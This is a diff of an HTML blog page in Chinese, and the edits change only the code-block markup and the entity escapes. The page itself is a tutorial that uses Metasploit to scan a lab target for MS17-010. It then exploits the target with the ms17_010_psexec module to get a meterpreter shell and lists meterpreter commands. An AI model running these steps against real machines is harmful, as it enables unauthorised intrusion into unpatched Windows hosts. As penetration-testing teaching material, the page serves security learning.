@@ -825,7 +825,7 @@ Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopene
 <p>接下来，通过 <strong><code>search</code></strong> 命令本次要利用到的MS17_010模块</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; search ms17_010
 </code></pre></div><p>然后就跳出一大堆</p>
-<pre><code>Matching Modules
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Matching Modules
 ================
 
    #  Name                                           Disclosure Date  Rank     Check  Description
@@ -835,7 +835,7 @@ Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopene
    2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
    3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
    4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
-</code></pre><p>嘛，我们先检测一下靶机是否存在这个漏洞，选第二个漏洞检测模块。</p>
+</code></pre></div><p>嘛，我们先检测一下靶机是否存在这个漏洞，选第二个漏洞检测模块。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010
 </code></pre></div><hr>
 <blockquote>
@@ -876,7 +876,7 @@ Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopene
 <p>回归正题，我们先看看这个模块的信息。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_ms17_010<span style="color:#f92672">)</span> &gt; info
 </code></pre></div><p>然后又出了一大堆qwq…</p>
-<pre><code>    Name: MS17-010 SMB RCE Detection
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">    Name: MS17-010 SMB RCE Detection
      Module: auxiliary/scanner/smb/smb_ms17_010
     License: Metasploit Framework License (BSD)
        Rank: Normal
@@ -906,12 +906,12 @@ Description:
   Uses information disclosure to determine if MS17-010 has been 
   patched or not. Specifically, it connects to the IPC$ tree and 
   attempts a transaction on FID 0. If the status returned is 
-  &quot;STATUS_INSUFF_SERVER_RESOURCES&quot;, the machine does not have the 
+  &#34;STATUS_INSUFF_SERVER_RESOURCES&#34;, the machine does not have the 
   MS17-010 patch. If the machine is missing the MS17-010 patch, the 
   module will check for an existing DoublePulsar (ring 0 
   shellcode/malware) infection. This module does not require valid SMB 
   credentials in default server configurations. It can log on as the 
-  user &quot;\&quot; and connect to IPC$.
+  user &#34;\&#34; and connect to IPC$.
 
 References:
   https://cvedetails.com/cve/CVE-2017-0143/
@@ -928,7 +928,7 @@ References:
 Also known as:
   DOUBLEPULSAR
   ETERNALBLUE
-</code></pre><p>然而这里我们只需要看那个<strong>Basic options</strong>部分就可以了，那两行有yes的，我们就知道了，我们需要指定一个<strong>目标IP(RHOST)</strong>，而那个 <strong>RPORT(目标端口)</strong> 已经被指定为445了。</p>
+</code></pre></div><p>然而这里我们只需要看那个<strong>Basic options</strong>部分就可以了，那两行有yes的，我们就知道了，我们需要指定一个<strong>目标IP(RHOST)</strong>，而那个 <strong>RPORT(目标端口)</strong> 已经被指定为445了。</p>
 <p>接下来执行…</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_ms17_010<span style="color:#f92672">)</span> &gt; set rhost 192.168.42.252
 msf5 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_ms17_010<span style="color:#f92672">)</span> &gt; run
@@ -948,7 +948,7 @@ msf5 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_ms17_010<span 
 然后继续执行info，没错，又会弹出一大堆。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_psexec<span style="color:#f92672">)</span> &gt; info
 </code></pre></div><p>对，就是下面这一大堆。</p>
-<pre><code>       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
      Module: exploit/windows/smb/ms17_010_psexec
    Platform: Windows
        Arch: x86, x64
@@ -1019,7 +1019,7 @@ Also known as:
   ETERNALROMANCE
   ETERNALCHAMPION
   ETERNALBLUE
-</code></pre><p>看到这么一大堆，你也不用紧张，其实跟上面的一样，你只需要设置四个东西</p>
+</code></pre></div><p>看到这么一大堆，你也不用紧张，其实跟上面的一样，你只需要设置四个东西</p>
 <ul>
 <li>RHOST，目标IP，目标的DHCP地址</li>
 <li>LHOST，监听IP，一般是你自己的DHCP地址</li>
@@ -1062,7 +1062,7 @@ meterpreter &gt;
 <p>那么至少可以干点什么呢，执行</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; help
 </code></pre></div><p>就可以看到帮助文档了。</p>
-<pre><code>Core Commands
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Core Commands
 =============
 
     Command                   Description
@@ -1096,7 +1096,7 @@ meterpreter &gt;
     set_timeouts              Set the current session timeout values
     sleep                     Force Meterpreter to go quiet, then re-establish session.
     transport                 Change the current transport mechanism
-    use                       Deprecated alias for &quot;load&quot;
+    use                       Deprecated alias for &#34;load&#34;
     uuid                      Get the UUID for the current session
     write                     Writes data to a channel
 
@@ -1158,7 +1158,7 @@ Stdapi: System Commands
     getsid        Get the SID of the user that the server is running as
     getuid        Get the user that the server is running as
     kill          Terminate a process
-    localtime     Displays the target system's local date and time
+    localtime     Displays the target system&#39;s local date and time
     pgrep         Filter processes by name
     pkill         Terminate processes by name
     ps            List running processes
@@ -1232,7 +1232,7 @@ Priv: Timestomp Commands
     Command       Description
     -------       -----------
     timestomp     Manipulate file MACE attributes
-</code></pre><p>嘛，返回来的很多是吧，这几个比较常用</p>
+</code></pre></div><p>嘛，返回来的很多是吧，这几个比较常用</p>
 <p><strong><code>cd</code></strong>、<strong><code>ls</code></strong>、<strong><code>shell</code></strong>、<strong><code>cat</code></strong></p>
 <p>懂Linux的人基本上都知道了，这里不多做解释了。</p>
 <h2 id="小结">小结</h2>
